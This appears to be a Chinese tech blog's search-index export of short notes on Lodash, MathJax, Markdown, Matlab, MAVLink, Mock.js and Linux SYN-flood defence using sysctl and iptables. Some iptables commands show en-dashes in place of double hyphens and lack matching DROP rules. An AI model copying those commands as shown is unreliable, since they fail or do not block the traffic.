<li>遍历 array、object 和 string</li>
<li>对值进行操作和检测</li>
<li>创建符合功能的函数</li>
</ul>
<h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_.defaults(&#123; &#39;a&#39;: 1 &#125;, &#123; &#39;a&#39;: 3, &#39;b&#39;: 2 &#125;);</span><br><span class="line">&#x2F;&#x2F; → &#123; &#39;a&#39;: 1, &#39;b&#39;: 2 &#125;</span><br><span class="line">_.partition([1, 2, 3, 4], n &#x3D;&gt; n % 2);</span><br><span class="line">&#x2F;&#x2F; → [[1, 3], [2, 4]]</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.lodashjs.com/" target="_blank" rel="noopener">Lodash</a>,by lodash homepage.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title>MathJax语法笔记</title>
    <url>/2019/01/05/MathJax%E8%AF%AD%E6%B3%95%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>MathJax是一个跨浏览器的JavaScript库，它使用MathML、LaTeX和ASCIIMathML标记在Web浏览器中显示数学符号。MathJax是在Apache许可证下作为开源软件发布的。</p>
<h1 id="安装MathJax"><a href="#安装MathJax" class="headerlink" title="安装MathJax"></a>安装MathJax</h1><p>MathJax有三种安装方式：最简单的方法就是使用分布式网络服务中的MathJax的副本，它位于 cdn.mathjax.org ,但是你也可以下载并安装一个MathJax的副本到你的服务器,或者使用在你本地硬盘的副本（这样是不需要使用网络）。 官方文档里有详细的描述。</p>
<h1 id="MathJax语法"><a href="#MathJax语法" class="headerlink" title="MathJax语法"></a>MathJax语法</h1><h2 id="如何插入公式"><a href="#如何插入公式" class="headerlink" title="如何插入公式"></a>如何插入公式</h2><p>LaTeX的数学公式有两种：行中公式和独立公式。行中公式放在文中与其它文字混编，独立公式单独成行。</p>
<p>行中公式可以用如下两种方法表示：</p>
<blockquote>
<p>(数学公式)　或　$数学公式$</p>
</blockquote>
<p>独立公式可以用如下两种方法表示：</p>
<blockquote>
<p>[数学公式]　或　$$数学公式$$</p>
</blockquote>
<h2 id="打Tag和引用公式"><a href="#打Tag和引用公式" class="headerlink" title="打Tag和引用公式"></a>打Tag和引用公式</h2><p>如果在某个公式之后，又想要引用原公式并说明原公式的出处，可以用 tagging/labelling/referencing system来做。 </p>
<p>可以用 \tag{yourtag} 来给原公式打 Tag。</p>
<p>$$m\frac{dV}{dt}=F \tag{1}$$</p>
<p>如果在后面需要引用它，就在 \tag 后面加上 \label{somelabel}，yourtag 和 somelabel不一定要一样，但最好一样。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zh.wikipedia.org/wiki/MathJax" target="_blank" rel="noopener">MathJax</a>, by wikipedia.</li>
<li><a href="https://www.zybuluo.com/knight/note/96093" target="_blank" rel="noopener">MathJax使用LaTeX语法编写数学公式教程</a>, by knight.</li>
<li><a href="https://www.mathjax.org/" target="_blank" rel="noopener">MathJax Home</a>, by mathjax.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>语法</tag>
      </tags>
  </entry>
  <entry>
    <title>Markdown语法笔记</title>
    <url>/2019/01/05/Markdown%E8%AF%AD%E6%B3%95%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>一直使用Markdown编辑文档，偶尔会遇到使用一些特殊Markdown语法，为了防止遗忘，特在此记录一下。</p>
<h1 id="强调"><a href="#强调" class="headerlink" title="强调"></a>强调</h1><p>在Markdown中，可以使用 * 和  _  表示斜体，用 ** 表示加粗。例如：</p>
<p><em>Coding，让开发更简单</em></p>
<p><em>Coding，让开发更简单</em></p>
<p><strong>Coding，让开发更简单</strong></p>
<h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><p>Markdown 标记区块引用和 email 中用 『&gt;』的引用方式类似，只需要在整个段落的第一行最前面加上 『&gt;』 ：</p>
<blockquote>
<p>Coding.net 为软件开发者提供基于云计算技术的软件开发平台，包括项目管理，代码托管，运行空间和质量控制等等。</p>
</blockquote>
<p>区块引用可以嵌套，只要根据层次加上不同数量的『&gt;』：</p>
<blockquote>
<p>这是第一级引用。</p>
<blockquote>
<p>这是第二级引用。</p>
</blockquote>
<p>现在回到第一级引用。</p>
</blockquote>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://coding.net/help/doc/project/markdown.html#i-6" target="_blank" rel="noopener">Markdown 语法介绍</a>, by coding.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>语法</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux防SYN_Flood攻击的方法</title>
    <url>/2019/10/30/Linux%E9%98%B2SYN-Flood%E6%94%BB%E5%87%BB%E7%9A%84%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>最近管理的Linux服务器遭遇了SYN Flood攻击，因此研究一下防范该攻击的方法。</p>
<h1 id="SYN-Flood攻击的表现"><a href="#SYN-Flood攻击的表现" class="headerlink" title="SYN Flood攻击的表现"></a>SYN Flood攻击的表现</h1><p>使用ssh登录Linux服务器，在终端中输入netstat -antp能查看到有大量的链接时SYN_RECV状态，说明Linux服务器遭遇了SYN Flood攻击。</p>
<h2 id="netstat常用参数"><a href="#netstat常用参数" class="headerlink" title="netstat常用参数"></a>netstat常用参数</h2><p>netstat常用参数如下：</p>
<ul>
<li>-a (all)显示所有选项，默认不显示LISTEN相关</li>
<li>-t (tcp)仅显示tcp相关选项</li>
<li>-u (udp)仅显示udp相关选项</li>
<li>-n 拒绝显示别名，能显示数字的全部转化成数字。</li>
<li>-l 仅列出有在 Listen (监听) 的服務状态</li>
<li>-p 显示建立相关链接的程序名</li>
<li>-r 显示路由信息，路由表</li>
<li>-e 显示扩展信息，例如uid等</li>
<li>-s 按各个协议进行统计</li>
<li>-c 每隔一个固定时间，执行该netstat命令。</li>
</ul>
<h2 id="TCP连接状态"><a href="#TCP连接状态" class="headerlink" title="TCP连接状态"></a>TCP连接状态</h2><ul>
<li>ESTABLISHED </li>
</ul>
<p>指TCP连接已建立，双方可以进行方向数据传递</p>
<ul>
<li>CLOSE_WAIT</li>
</ul>
<p>这种状态的含义其实是表示在等待关闭。当对方close一个SOCKET后发送FIN报文给自己，你系统毫无疑问地会回应一个ACK报文给对方，此时则进入到CLOSE_WAIT状态。</p>
<ul>
<li>LISTENING</li>
</ul>
<p>指TCP正在监听端口，可以接受链接</p>
<ul>
<li>TIME_WAIT</li>
</ul>
<p>指连接已准备关闭。表示收到了对方的FIN报文，并发送出了ACK报文，就等2MSL后即可回到CLOSED可用状态了。</p>
<ul>
<li>FIN_WAIT_1</li>
</ul>
<p>FIN_WAIT_1和 FIN_WAIT_2状态的真正含义都是表示等待对方的FIN报 文。而这两种状态的区别是：FIN_WAIT_1状态实际上是当SOCKET在ESTABLISHED状态时，它想主动关闭连接，向对方发送了FIN 报文，此时该SOCKET即进入到FIN_WAIT_1 状态。而当对方回应ACK 报文后，则进入到FIN_WAIT_2状态，当然在实际的正常情况 下，无论对方何种情况下，都应该马上回应ACK报文，所以FIN_WAIT_1状态一般是比较难见到的，而FIN_WAIT_2 状态还有时常常可以用 netstat看到。</p>
<ul>
<li>FIN_WAIT_2</li>
</ul>
<p>FIN_WAIT_2 状态下的SOCKET，表示半连接，也即有一方要求close 连接，但另外还告诉对方，我暂时还有点数据需要传送给你，稍后再关闭连接。</p>
<ul>
<li>LAST_ACK</li>
</ul>
<p>是被动关闭一方在发送FIN报文后，最后等待对方的ACK报文。当收到ACK报文后，也即可以进入到CLOSED可用状态了</p>
<ul>
<li>SYNC_RECEIVED</li>
</ul>
<p>表示接受到了SYN报文，在正常情况下，这个状态是服务器端的SOCKET在建立TCP连接时的三次握手会话过程中的一个中间状态，很短暂，基本上用netstat你是很难看到这种状态的，除非你特意写了一个客户端测试程序，故意将三次TCP握手过程中最后一个ACK报文不予发送。</p>
<ul>
<li>SYNC_SEND</li>
</ul>
<p>已经主动发出连接建立请求。与SYN_RCVD遥想呼应，当客户端SOCKET执行CONNECT连接时，它首先发送SYN报文，因此也随即它会进入到了SYN_SENT状态，并等待服务端的发送三次握手中的第2个报文。</p>
<h1 id="防范措施"><a href="#防范措施" class="headerlink" title="防范措施"></a>防范措施</h1><p>首先确保ssh登录密码没有泄露，再修改系统相关配置。</p>
<h2 id="剔出其他登录用户"><a href="#剔出其他登录用户" class="headerlink" title="剔出其他登录用户"></a>剔出其他登录用户</h2><p>当ssh登录密码泄露，会有其他用户登录，所以需要剔出其他登录用户，再修改密码和系统相关配置。剔出其他登录用户的方法如下：</p>
<ul>
<li>查看系统在线用户</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@apache ~]# w </span><br><span class="line">14:15:41 up 42 days, 56 min,  2 users,  load average: 0.07, 0.02, 0.00 </span><br><span class="line">USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT </span><br><span class="line">root     pts&#x2F;0    116.204.64.165   14:15    0.00s  0.06s  0.04s w </span><br><span class="line">root     pts&#x2F;1    116.204.64.165   14:15    2.00s  0.02s  0.02s –bash</span><br></pre></td></tr></table></figure>

<ul>
<li>查看当前自己占用终端，防止把自己干掉了</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@apache ~]# who am i </span><br><span class="line">root     pts&#x2F;0        2013-01-16 14:15 (116.204.64.165)</span><br></pre></td></tr></table></figure>

<ul>
<li>用pkill 命令剔除对方</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 信号代码 -9 ，表示强制终止</span><br><span class="line">[root@apache ~]# pkill -9 -t pts&#x2F;1</span><br></pre></td></tr></table></figure>

<ul>
<li>用w命令在看看干掉没。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@apache ~]# w </span><br><span class="line">14:19:47 up 42 days,  1:00,  1 user,  load average: 0.00, 0.00, 0.00 </span><br><span class="line">USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT </span><br><span class="line">root     pts&#x2F;0    116.204.64.165   14:15    0.00s  0.03s  0.00s w</span><br></pre></td></tr></table></figure>

<h2 id="抵御SYN攻击的方法"><a href="#抵御SYN攻击的方法" class="headerlink" title="抵御SYN攻击的方法"></a>抵御SYN攻击的方法</h2><p>SYN攻击是利用TCP/IP协议3次握手的原理，发送大量的建立连接的网络包，但不实际建立连接，最终导致被攻击服务器的网络队列被占满，无法被正常用户访问。</p>
<h3 id="修改SYN相关系统配置"><a href="#修改SYN相关系统配置" class="headerlink" title="修改SYN相关系统配置"></a>修改SYN相关系统配置</h3><p>Linux内核提供了若干SYN相关的配置，用命令： sysctl -a | grep syn 看到：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net.ipv4.tcp_max_syn_backlog &#x3D; 1024 </span><br><span class="line">net.ipv4.tcp_syncookies &#x3D; 0</span><br><span class="line">net.ipv4.tcp_synack_retries &#x3D; 5 </span><br><span class="line">net.ipv4.tcp_syn_retries &#x3D; 5</span><br></pre></td></tr></table></figure>

<p>tcp_max_syn_backlog是SYN队列的长度，tcp_syncookies是一个开关，是否打开SYN Cookie 功能，该功能可以防止部分SYN攻击tcp_synack_retries和tcp_syn_retries定义SYN 的重试次数。　　</p>
<p>加大SYN队列长度可以容纳更多等待连接的网络连接数，打开SYN Cookie功能可以阻止部分 SYN攻击，降低重试次数也有一定效果。</p>
<p>调整上述设置的方法是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 增加SYN队列长度到2048：</span><br><span class="line">sysctl -w net.ipv4.tcp_max_syn_backlog&#x3D;2048</span><br><span class="line"></span><br><span class="line"># 打开SYN COOKIE功能：</span><br><span class="line">sysctl -w net.ipv4.tcp_syncookies&#x3D;1</span><br><span class="line"></span><br><span class="line"># 降低重试次数：</span><br><span class="line">sysctl -w net.ipv4.tcp_synack_retries&#x3D;3 </span><br><span class="line">sysctl -w net.ipv4.tcp_syn_retries&#x3D;3</span><br></pre></td></tr></table></figure>

<p>为了系统重启动时保持上述配置，可将上述命令加入到/etc/rc.d/rc.local文件中。</p>
<h3 id="iptables阻止syn-flood攻击"><a href="#iptables阻止syn-flood攻击" class="headerlink" title="iptables阻止syn flood攻击"></a>iptables阻止syn flood攻击</h3><p>防止同步包洪水（Sync Flood）:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># –limit 1&#x2F;s 限制syn并发数每秒1次，可以根据自己的需要修改</span><br><span class="line">iptables -A FORWARD -p tcp –syn -m limit –limit 1&#x2F;s -j ACCEPT</span><br></pre></td></tr></table></figure>

<p>防止各种端口扫描:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iptables -A FORWARD -p tcp –tcp-flags SYN,ACK,FIN,RST RST -m limit –limit 1&#x2F;s -j ACCEPT</span><br></pre></td></tr></table></figure>

<p>Ping洪水攻击（Ping of Death）:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iptables -A FORWARD -p icmp –icmp-type echo-request -m limit –limit 1&#x2F;s -j ACCEPT</span><br></pre></td></tr></table></figure>

<p>屏蔽 SYN_RECV 的连接：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -p tcp -m tcp –tcp-flags SYN,RST,ACK SYN -m limit –limit 1&#x2F;sec -j ACCEPT</span><br></pre></td></tr></table></figure>

<p>禁止某IP访问：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iptables -I INPUT -s xxx.xxx.xxx.xx -j DROP</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.cnblogs.com/derekchen/archive/2011/02/26/1965850.html" target="_blank" rel="noopener">LINUX 服务器遭到SYN FLOOD攻击</a>,by 晓风残梦.</li>
<li><a href="https://www.cnblogs.com/ggjucheng/archive/2012/01/08/2316661.HTML" target="_blank" rel="noopener">Linux netstat命令详解</a>,by ggjucheng.</li>
<li><a href="https://linux.cn/article-2434-1.html" target="_blank" rel="noopener">netstat 的10个基本用法</a>,by  LCTT bazz2.</li>
<li><a href="https://www.cnblogs.com/vigarbuaa/archive/2012/03/07/2383064.html" target="_blank" rel="noopener">netstat用法及TCP state解析</a>,by vigarbuaa.</li>
<li><a href="https://www.cnblogs.com/wjoyxt/p/7905354.html" target="_blank" rel="noopener">Linux踢出其他正在SSH登陆用户</a>,by 艾欧里亚.</li>
<li><a href="https://www.cnblogs.com/rsky/p/4886043.html" target="_blank" rel="noopener">[Linux] killall 、kill 、pkill 命令详解</a>,by 骑着蜗牛游世界.</li>
<li><a href="https://blog.csdn.net/simongeek/article/details/46429243" target="_blank" rel="noopener">Linux中kill，pkill，killall和xkill命令汇总讲解</a>,by simonGeek.</li>
<li><a href="http://www.sphinxsearch.org/archives/10" target="_blank" rel="noopener">Linux防止syn flood攻击，屏蔽 SYN_RECV 的连接</a>,by Sphinx 中文站.</li>
<li><a href="https://wangchujiang.com/linux-command/c/iptables.html" target="_blank" rel="noopener">iptables</a>,by wangchujiang.</li>
<li><a href="https://www.jianshu.com/p/3c7a0771b67e" target="_blank" rel="noopener">TCP状态机</a>,by 大蟒传奇.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Matlab导出精美论文插图</title>
    <url>/2022/03/29/Matlab%E5%AF%BC%E5%87%BA%E7%B2%BE%E7%BE%8E%E8%AE%BA%E6%96%87%E6%8F%92%E5%9B%BE/</url>
    <content><![CDATA[<p>Matlab绘图代码示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">x &#x3D; 0:0.01:0.05;</span><br><span class="line">y &#x3D; 1:-0.18:0.1;</span><br><span class="line">plot(x,y)</span><br><span class="line"></span><br><span class="line">x &#x3D; [0   0.2 0.5  1.2  1.8   2.5  3.3  3.8  4  5];</span><br><span class="line">y &#x3D; [1  -1    0   0.8   0   -0.6   0   0.2  0.15  -0.1];</span><br><span class="line">xx&#x3D;[0:0.01:5]; yy&#x3D;spline(x,y,xx); %三次样条插值函数</span><br><span class="line">plot(xx,yy)</span><br><span class="line"></span><br><span class="line">% 显示坐标区网格线</span><br><span class="line">grid on</span><br><span class="line"></span><br><span class="line">% 设置坐标轴范围</span><br><span class="line">xlim([0 0.06])</span><br><span class="line">ylim([0 1])</span><br><span class="line"></span><br><span class="line">% 设置坐标轴刻度</span><br><span class="line">xticks([0 0.02 0.04 0.06])</span><br><span class="line">yticks([0 0.5 1])</span><br><span class="line"></span><br><span class="line">% 设置图框纵横比</span><br><span class="line">left&#x3D;200;%距屏幕左下角水平距离</span><br><span class="line">bottem&#x3D;200;%距屏幕左下角垂直距离</span><br><span class="line">width&#x3D;400;%宽度，像素数</span><br><span class="line">height&#x3D;200;%高度</span><br><span class="line">set(gcf,&#39;position&#39;,[left,bottem,width,height])</span><br><span class="line"></span><br><span class="line">% 设置坐标轴名称</span><br><span class="line">xlabel(&#39;t&#x2F;s&#39;) </span><br><span class="line">ylabel(&#39;\omega_x&#x2F;(\circ)*s^&#123;-1&#125;&#39;)</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zhuanlan.zhihu.com/p/65116358" target="_blank" rel="noopener">MATLAB如何导出精美的论文插图？</a>,by 易夕.</li>
<li><a href="https://ww2.mathworks.cn/help/matlab/creating_plots/greek-letters-and-special-characters-in-graph-text.html" target="_blank" rel="noopener">MATLAB图文本中的希腊字母和特殊字符</a>,by matlab.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>Matlab</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript从字符串中创建函数的方法</title>
    <url>/2021/02/26/JavaScript%E4%BB%8E%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%AD%E5%88%9B%E5%BB%BA%E5%87%BD%E6%95%B0%E7%9A%84%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>以下链接中提供了四种JavaScript从字符串中创建函数的方法，可以学习以下。</p>
<p><a href="https://stackoverflow.com/questions/7650071/is-there-a-way-to-create-a-function-from-a-string-with-javascript" target="_blank" rel="noopener">Is there a way to create a function from a string with javascript?</a></p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://stackoverflow.com/questions/7650071/is-there-a-way-to-create-a-function-from-a-string-with-javascript" target="_blank" rel="noopener">Is there a way to create a function from a string with javascript?</a>,by phnah.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>前端</tag>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>Matlab浮点数比较方法</title>
    <url>/2021/12/17/Matlab%E6%B5%AE%E7%82%B9%E6%95%B0%E6%AF%94%E8%BE%83%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>Matlab中的浮点数按照IEEE754约定，以有限的精度进行存储。因此，在进行浮点数的比较时，要特别小心，防止看不见的误差导致错误的结果。例如在Matlab中输入如下代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">testNum&#x3D;0:0.1:1</span><br><span class="line">testNum(4) &#x3D;&#x3D; 0.3 % 结果将表示两者不相等</span><br></pre></td></tr></table></figure>

<p>最好采用如下方式比较两个浮点数是否相等：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">abs(testNum(4)-0.3)&lt;eps</span><br></pre></td></tr></table></figure>


<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://ww2.mathworks.cn/matlabcentral/answers/267964-while-comparing-the-equality-of-two-floating-numbers-a-b-we-use-abs-a-b-tolerance-could-anyo" target="_blank" rel="noopener">While comparing the equality of two floating numbers(a,b), we use abs(a – b) &lt; tolerance. Could anyone let me know if there’s anyway that this function may yield bad results or errors ?</a>,by mathworks.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>Matlab</tag>
      </tags>
  </entry>
  <entry>
    <title>Matlab_Stateflow_Chart无法初始化向量或数组的解决方法</title>
    <url>/2020/03/14/Matlab-Stateflow-Chart%E6%97%A0%E6%B3%95%E5%88%9D%E5%A7%8B%E5%8C%96%E5%90%91%E9%87%8F%E6%88%96%E6%95%B0%E7%BB%84%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>最近在使用Matlab的Stateflow工具箱时，发现无法初始化类型为向量或矩阵的变量。在网上搜索了很久，终于发现类似问题的解决方法，参考链接<a href="https://www.mathworks.com/matlabcentral/answers/98022-why-am-i-unable-to-initialize-the-local-vector-or-matrix-data-in-my-stateflow-chart" target="_blank" rel="noopener">Why am I unable to initialize the local vector or matrix data in my Stateflow chart?</a>。</p>
<p>具体解决方法是：</p>
<ul>
<li>定义一个常量，维度与向量变量或矩阵变量一致，设置常量的数值。</li>
<li>使用定义的常量去初始化变量</li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.mathworks.com/matlabcentral/answers/98022-why-am-i-unable-to-initialize-the-local-vector-or-matrix-data-in-my-stateflow-chart" target="_blank" rel="noopener">Why am I unable to initialize the local vector or matrix data in my Stateflow chart?</a>,by mathworks.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>Matlab</tag>
      </tags>
  </entry>
  <entry>
    <title>MAVLink协议解析</title>
    <url>/2019/06/13/Mavlink%E5%8D%8F%E8%AE%AE%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<p>MAVLink是一种非常轻量级的消息传递协议，用于与无人机（以及板载无人机组件之间）进行通信。</p>
<p>MAVLink遵循现代混合发布-订阅和点对点设计模式：数据流作为主题发送/发布，而配置子协议（如任务协议或参数协议）是点对点重传。</p>
<p>消息在XML文件中定义。每个XML文件定义特定MAVLink系统支持的消息集，也称为“方言”。由大多数地面控制站和自动驾驶仪实现的参考消息集在common.xml中定义（大多数方言构建在此定义的顶部）。</p>
<p>MAVLink工具链使用XML消息定义为每种受支持的编程语言生成MAVLink库。无人机，地面控制站和其他MAVLink系统使用生成的库进行通信。这些通常是MIT许可的，因此可以在任何闭源应用程序中无限制地使用，而无需发布闭源应用程序的源代码。</p>
<p>MAVLink于2009年初由Lorenz Meier首次发布，现在已经有相当数量的贡献者。</p>
<h1 id="MAVLink消息格式"><a href="#MAVLink消息格式" class="headerlink" title="MAVLink消息格式"></a>MAVLink消息格式</h1><p>MAVLink消息格式如图1所示。</p>
<p align="center">
    <img src="images/MAVLink_msg.webp" width="90%" alt="MAVLink消息格式"/>
</p>
<center>图1  MAVLink消息格式</center>

<p>MAVLink消息中各字段含义如图2所示。</p>
<p align="center">
    <img src="images/Msg_Desc.webp" width="90%" alt="MAVLink消息格式描述"/>
</p>
<center>图2  MAVLink消息格式描述</center>



<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://mavlink.io/en/" target="_blank" rel="noopener">MAVLink Developer Guide</a>,by mavlink homepage.</li>
<li><a href="https://www.jianshu.com/p/23fddff60369" target="_blank" rel="noopener">无人机通讯协议 –Mavlink 学习</a>, by Theshy.</li>
<li><a href="https://blog.csdn.net/oqqENvY12/article/details/61615609" target="_blank" rel="noopener">Pixhawk原生固件PX4之MAVLink协议解析</a>,by FantasyJXF.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>无人机</tag>
        <tag>MAVLink</tag>
      </tags>
  </entry>
  <entry>
    <title>Mockjs入门简介</title>
    <url>/2019/08/09/Mockjs%E5%85%A5%E9%97%A8%E7%AE%80%E4%BB%8B/</url>
    <content><![CDATA[<p>Mock.js可生成随机数据，拦截Ajax请求，实现前后端分离的目的。Mockjs支持生成随机的文本、数字、布尔值、日期、邮箱、链接、图片、颜色等数据类型，增加了单元测试的真实性，具有用法简单，方便扩展和开发无侵入的特点。下面简单介绍Mockjs的用法。</p>
<h1 id="开始-amp-安装"><a href="#开始-amp-安装" class="headerlink" title="开始 &amp; 安装"></a>开始 &amp; 安装</h1><h2 id="Node-CommonJS"><a href="#Node-CommonJS" class="headerlink" title="Node (CommonJS)"></a>Node (CommonJS)</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 安装</span><br><span class="line">npm install mockjs</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 使用 Mock</span><br><span class="line">var Mock &#x3D; require(&#39;mockjs&#39;)</span><br><span class="line">var data &#x3D; Mock.mock(&#123;</span><br><span class="line">    &#x2F;&#x2F; 属性 list 的值是一个数组，其中含有 1 到 10 个元素</span><br><span class="line">    &#39;list|1-10&#39;: [&#123;</span><br><span class="line">        &#x2F;&#x2F; 属性 id 是一个自增数，起始值为 1，每次增 1</span><br><span class="line">        &#39;id|+1&#39;: 1</span><br><span class="line">    &#125;]</span><br><span class="line">&#125;)</span><br><span class="line">&#x2F;&#x2F; 输出结果</span><br><span class="line">console.log(JSON.stringify(data, null, 4))</span><br></pre></td></tr></table></figure>

<h1 id="语法规范"><a href="#语法规范" class="headerlink" title="语法规范"></a>语法规范</h1><p>Mock.js 的语法规范包括两部分：</p>
<ul>
<li>数据模板定义规范（Data Template Definition，DTD）</li>
<li>数据占位符定义规范（Data Placeholder Definition，DPD）</li>
</ul>
<h2 id="数据模板定义规范-DTD"><a href="#数据模板定义规范-DTD" class="headerlink" title="数据模板定义规范 DTD"></a>数据模板定义规范 DTD</h2><p>数据模板中的每个属性由 3 部分构成：属性名、生成规则、属性值：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 属性名   name</span><br><span class="line">&#x2F;&#x2F; 生成规则 rule</span><br><span class="line">&#x2F;&#x2F; 属性值   value</span><br><span class="line">&#39;name|rule&#39;: value</span><br></pre></td></tr></table></figure>

<p>注意：</p>
<ul>
<li>属性名 和 生成规则 之间用竖线 | 分隔。</li>
<li>生成规则 是可选的。</li>
<li>生成规则 有 7 种格式：<ul>
<li>‘name|min-max’: value</li>
<li>‘name|count’: value</li>
<li>‘name|min-max.dmin-dmax’: value</li>
<li>‘name|min-max.dcount’: value</li>
<li>‘name|count.dmin-dmax’: value</li>
<li>‘name|count.dcount’: value</li>
<li>‘name|+step’: value</li>
</ul>
</li>
<li>生成规则 的 含义 需要依赖 属性值的类型 才能确定。</li>
<li>属性值 中可以含有 @占位符。</li>
<li>属性值 还指定了最终值的初始值和类型。</li>
</ul>
<h2 id="数据占位符定义规范-DPD"><a href="#数据占位符定义规范-DPD" class="headerlink" title="数据占位符定义规范 DPD"></a>数据占位符定义规范 DPD</h2><p>占位符 只是在属性值字符串中占个位置，并不出现在最终的属性值中。</p>
<p>占位符 的格式为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@占位符</span><br><span class="line">@占位符(参数 [, 参数])</span><br></pre></td></tr></table></figure>

<p>注意：</p>
<ul>
<li>用 @ 来标识其后的字符串是 占位符。</li>
<li>占位符 引用的是 Mock.Random 中的方法。</li>
<li>通过 Mock.Random.extend() 来扩展自定义占位符。</li>
<li>占位符 也可以引用 数据模板 中的属性。</li>
<li>占位符 会优先引用 数据模板 中的属性。</li>
<li>占位符 支持 相对路径 和 绝对路径。</li>
</ul>
<h1 id="Mock-Random"><a href="#Mock-Random" class="headerlink" title="Mock.Random"></a>Mock.Random</h1><p>Mock.Random 是一个工具类，用于生成各种随机数据。</p>
<p><strong>Mock.Random 的方法在数据模板中称为『占位符』，书写格式为 @占位符(参数 [, 参数]) 。</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var Random &#x3D; Mock.Random</span><br><span class="line">Random.email()</span><br><span class="line">&#x2F;&#x2F; &#x3D;&gt; &quot;n.clark@miller.io&quot;</span><br><span class="line">Mock.mock(&#39;@email&#39;)</span><br><span class="line">&#x2F;&#x2F; &#x3D;&gt; &quot;y.lee@lewis.org&quot;</span><br><span class="line">Mock.mock( &#123; email: &#39;@email&#39; &#125; )</span><br><span class="line">&#x2F;&#x2F; &#x3D;&gt; &#123; email: &quot;v.lewis@hall.gov&quot; &#125;</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://github.com/nuysoft/Mock" target="_blank" rel="noopener">Mockjs</a>,by nuysoft.</li>
<li><a href="https://github.com/nuysoft/Mock/wiki/Syntax-Specification" target="_blank" rel="noopener">Mockjs语法规范</a>,by nuysoft.</li>
<li><a href="https://github.com/nuysoft/Mock/wiki/Mock.Random" target="_blank" rel="noopener">Mock.Random</a>,by nuysoft.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>Matplotlib蜡烛图绘制教程</title>
    <url>/2018/06/03/Matplotlib%E8%9C%A1%E7%83%9B%E5%9B%BE%E7%BB%98%E5%88%B6%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<p>股票分析离不开各种图表的绘制，尤其是最常用的蜡烛图。下面介绍python中使用matplotlib绘制蜡烛图的过程。</p>
